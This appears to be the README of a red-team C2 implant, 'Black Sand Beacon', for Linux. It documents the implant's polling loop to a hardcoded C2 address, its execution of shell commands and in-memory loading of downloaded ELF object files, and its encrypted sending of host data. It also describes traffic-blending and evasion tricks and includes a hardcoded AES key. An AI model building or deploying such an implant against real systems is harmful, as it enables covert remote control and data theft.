# Black Sand Beacon

Micro beacon for LazyOwn RedTeam Framework C2 inspired in Black Basalt Beacon

- Command execution
- Bof Execution


## System Architecture
Black Sand Beacon is a modular C2 agent with a layered architecture consisting of:

- Beacon Core: Main orchestrator implementing the command polling loop
- Cryptography Layer: Dual encryption (TLS + AES-256 CFB) with Base64 encoding
- Execution Engines: Shell command executor and in-memory ELF loader for BOFs
- Data Processing: JSON serialization using cJSON library
- Network Layer: HTTPS communication via libcurl with malleable C2 profiles

## Beacon Core Loop
The main execution loop resides in main() at 
beacon3.c
637-808
 The beacon operates in a continuous 6-second polling cycle:

## Initialization 
beacon3.c
638-648
:

### Generates AES key from hex string KEY_HEX
Constructs C2 URL using C2_URL, MALEABLE, and CLIENT_ID constants
Initializes random seed for User-Agent rotation
Command Retrieval 
beacon3.c
650-693
:

### Issues HTTPS GET request to C2 server
Base64 decodes response
Extracts IV from first 16 bytes
AES-256 CFB decrypts command payload
Command Execution 
beacon3.c
695-716
:

### Shell commands: Execute via exec_cmd() using popen()
BOF commands: Download ELF via download_bof(), execute via RunELF()
Result Transmission 
beacon3.c
726-796
:

### Constructs JSON with system metadata and command output
AES-256 CFB encrypts with random IV
Base64 encodes payload
POSTs to C2 server

## Malleable C2 Profile
URL construction uses configurable components 
beacon3.c
32-34
:

- C2_URL: Base server address
- MALEABLE: URI path pattern (/pleasesubscribe/v1/users/)
- CLIENT_ID: Beacon identifier (linux)

## C2 Communication Protocol

This document describes the HTTPS-based command and control communication protocol used by the Black Sand Beacon to communicate with the LazyOwn RedTeam Framework C2 server. It covers the transport layer, encryption mechanisms, message encoding, request/response patterns, and malleable C2 profile configuration.

For information about command execution after receiving C2 instructions, see Command Execution. For details on the cryptographic implementations, see Encryption Protocol.

## Protocol Overview
The Black Sand Beacon implements a pull-based C2 protocol over HTTPS with dual-layer encryption. The beacon continuously polls the C2 server at regular intervals to retrieve commands, executes them, and transmits results back to the server. All communications use TLS for transport security plus an additional application-level AES-256 CFB encryption layer.

## Transport Layer
### HTTPS Configuration
The beacon uses libcurl for all HTTP/HTTPS communications. The https_request function handles both command retrieval (GET) and result transmission (POST).

CURL Configuration Details:

The https_request function 
beacon3.c
154-240
 configures the following critical options:

### SSL Verification Disabled 
beacon3.c
175-176
: Both CURLOPT_SSL_VERIFYPEER and CURLOPT_SSL_VERIFYHOST are set to 0L to allow connections to C2 servers with self-signed certificates
Timeout Settings 
beacon3.c
177-178
: 10-second overall timeout, 5-second connection timeout
User-Agent Randomization 
beacon3.c
174
: Randomly selects from USER_AGENTS array to vary traffic fingerprint
Memory Callback 
beacon3.c
180-181
: Uses WriteMemoryCallback to accumulate response data in a dynamically allocated buffer
Sources: 
beacon3.c
154-240
 
beacon3.c
136-151

### URL Construction and Malleable Profiles
The beacon constructs C2 URLs using configurable components to enable traffic blending:

Malleable C2 Configuration:

Constant	Default Value	Purpose	Location
C2_URL	"https://10.10.14.57:4444"	Base C2 server address	
beacon3.c
32
MALEABLE	"/pleasesubscribe/v1/users/"	URI path for traffic blending	
beacon3.c
34
CLIENT_ID	"linux"	Client identifier	
beacon3.c
33
The full URL is constructed at initialization: full_url = C2_URL + MALEABLE + CLIENT_ID 
beacon3.c
646-647

### User-Agent Rotation:

The beacon randomly selects from 4 User-Agent strings 
beacon3.c
37-42
 on each request 
beacon3.c
174
:

- Chrome on Linux x86_64
- Firefox on Ubuntu
- Chrome on Android mobile
- Chrome on Windows 10
Sources: 
beacon3.c
32-42
 
beacon3.c
646-647
 
beacon3.c
174

## Encryption Layer
AES-256 CFB Implementation
The beacon implements a custom AES-256 Cipher Feedback (CFB) mode for application-level encryption. This provides an additional security layer beyond TLS, protecting payloads even if TLS is compromised.

CFB Mode Implementation Details:

Both aes256_cfb_encrypt 
beacon3.c
283-309
 and aes256_cfb_decrypt 
beacon3.c
311-338
 follow the CFB algorithm:

### Initialization 
beacon3.c
285-289
 
beacon3.c
313-317
: Initialize AES context with 256-bit key, copy IV to working buffer
Block Processing 
beacon3.c
291-306
 
beacon3.c
319-334
:
Encrypt IV buffer using AES-ECB: AES_ECB_encrypt(&ctx, encrypted_iv) 
beacon3.c
294
 
beacon3.c
322
XOR result with plaintext/ciphertext block 
beacon3.c
296-298
 
beacon3.c
324-326
Update IV buffer with output ciphertext 
beacon3.c
300-304
 
beacon3.c
328-332
Output 
beacon3.c
307-308
 
beacon3.c
335-337
: Return encrypted/decrypted buffer
Sources: 
beacon3.c
283-338
 
aes.c
239-242
 
aes.c
490-494

### Key Management
The AES-256 key is hardcoded in the beacon binary as a hexadecimal string and converted to binary at runtime:

// Key initialization in main()
const char* KEY_HEX = "88a41baa358a779c346d3ea784bc03f50900141bb58435f4c50864c82ff624ff";
unsigned char AES_KEY[32];
for (int i = 0; i < 32; i++) {
    sscanf(KEY_HEX + i * 2, "%2hhx", &AES_KEY[i]);
}
### IV Generation:

Outbound Messages: Random 16-byte IV generated using OpenSSL's RAND_bytes(iv_out, 16) 
beacon3.c
763
Inbound Messages: IV extracted from first 16 bytes of encrypted payload 
beacon3.c
675-676
Sources: 
beacon3.c
640-644
 
beacon3.c
763
 
beacon3.c
675-676

Message Format
Inbound Message Structure (Commands)
Commands received from the C2 server follow this structure:

### Processing Pipeline:

Receive 
beacon3.c
656
: GET request to full_url returns Base64-encoded payload
Decode 
beacon3.c
667
: base64_decode(b64_resp, &enc_len) → encrypted bytes
Extract IV 
beacon3.c
675-676
: First 16 bytes are the IV, remainder is ciphertext
Decrypt 
beacon3.c
678
: aes256_cfb_decrypt(AES_KEY, iv, ciphertext, enc_len - 16, &plain_len) → plaintext command
Command Types:

### Command Pattern	Action	Handler Location
bof:<url>	Download and execute BOF from URL	
beacon3.c
698-712
Any other string	Execute as shell command via popen()	
beacon3.c
714
Sources: 
beacon3.c
656-693
 
beacon3.c
698-716
 
beacon3.c
243-280
 
beacon3.c
311-338

### Outbound Message Structure (Results)
Results transmitted to the C2 server are JSON objects encrypted and encoded:

JSON Structure:

The beacon constructs a JSON object using the cJSON library 
beacon3.c
734-744
:
```json
{
  "output": "<command/BOF output>",
  "client": "linux",
  "command": "<executed command>",
  "pid": 1234,
  "hostname": "<system hostname>",
  "ips": "<comma-separated local IPs>",
  "user": "<username>",
  "discovered_ips": "",
  "result_portscan": null,
  "result_pwd": "<current working directory>"
}
```

### Encryption and Transmission:

Serialize 
beacon3.c
746
: cJSON_PrintUnformatted(root) → JSON string
Generate IV 
beacon3.c
763
: RAND_bytes(iv_out, 16) → random IV
Encrypt 
beacon3.c
765
: aes256_cfb_encrypt(AES_KEY, iv_out, json_str, strlen(json_str), &encrypted_len) → ciphertext
Concatenate 
beacon3.c
768-770
: IV || Ciphertext → combined buffer
Encode 
beacon3.c
771
: base64_encode(full_enc, 16 + encrypted_len) → Base64 string
Transmit 
beacon3.c
777
: https_request(full_url, "POST", b64_resp) → send to C2
Sources: 
beacon3.c
726-796
 
beacon3.c
243-258
 
beacon3.c
283-309

### Request/Response Flow
Main Communication Loop
The beacon operates in a continuous polling loop with a fixed interval:

## BOF Concept
A Beacon Object File (BOF) is a compiled ELF relocatable object file (.o) that contains custom functionality to be executed by the beacon. BOFs enable modular capability extension without modifying the core beacon executable.

### ELF Loading Mechanism
The RunELF function at 
beacon3.c
361-532
 implements a complete in-memory ELF loader that parses relocatable object files and prepares them for execution.

### Symbol Resolution
BOFs reference external functions (libc, beacon API) that must be resolved at load time. The beacon maintains a symbol resolver table that maps symbol names to function pointers.

### Symbol Resolver Table
The g_external_symbols[] array at 
beacon3.c
76-90
 defines all externally visible symbols:

### Symbol Name	Pointer Variable	Purpose
- printf	g_printf_ptr	Standard output (debugging)
- strlen	g_strlen_ptr	String length calculation
- memcpy	g_memcpy_ptr	Memory copy operations
- memset	g_memset_ptr	Memory initialization
- BeaconPrintf	g_BeaconPrintf_ptr	Formatted output to beacon
- BeaconOutput	g_BeaconOutput_ptr	Raw output to beacon
- dlsym	g_dlsym_ptr	Dynamic symbol lookup
- dlopen	g_dlopen_ptr	Dynamic library loading

### Symbol Resolution Algorithm
Sources: 
beacon3.c
461-470

### The resolution process at 
beacon3.c
461-470
 first checks if a symbol is defined within the BOF itself (local symbol), then falls back to the external symbol table. Unresolved symbols are logged but do not halt execution.

### Relocation Processing
After loading sections into memory, the loader must patch code and data references to point to their actual runtime addresses. This is accomplished by processing SHT_RELA sections.

### Supported Relocation Types
Type	Value	Description	Implementation
- R_X86_64_64	1	64-bit absolute address	*loc = symbol_addr + addend
- R_X86_64_PC32	2	32-bit PC-relative offset	*loc = symbol_addr + addend - loc
- R_X86_64_PLT32	4	32-bit PLT-relative offset	Same as PC32
- R_X86_64_32	10	32-bit absolute address	*loc = (uint32_t)(symbol_addr + addend)

### Execution Model
Once the ELF is loaded and relocated, the beacon locates the go function and executes it in an isolated stack frame.

### Entry Point Discovery
The loader searches the symbol table for a function named go:

### Overview
The ELF loader is implemented in the RunELF function, which performs the following operations:

- ELF validation - Verifies ELF magic bytes and architecture
- Section parsing - Locates symbol tables, string tables, and loadable sections
- Memory mapping - Allocates RWX memory regions for code and data sections
- Symbol resolution - Resolves external symbols using dlsym and a predefined symbol table
- Relocation processing - Applies ELF relocations to resolve references
- Function lookup - Locates the entry point function by name
- Execution - Invokes the BOF using a stack-aligned assembly wrapper

## Links

- [https://medium.com/@lazyown.redteam/black-sand-beacon-when-your-linux-box-starts-whispering-to-c2-in-aes-256-cfb-and-no-one-notices-105ca5ed9547](https://medium.com/@lazyown.redteam/black-sand-beacon-when-your-linux-box-starts-whispering-to-c2-in-aes-256-cfb-and-no-one-notices-105ca5ed9547)
- [https://www.podbean.com/eas/pb-qe42t-198ee9d](https://www.podbean.com/eas/pb-qe42t-198ee9d)



![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)
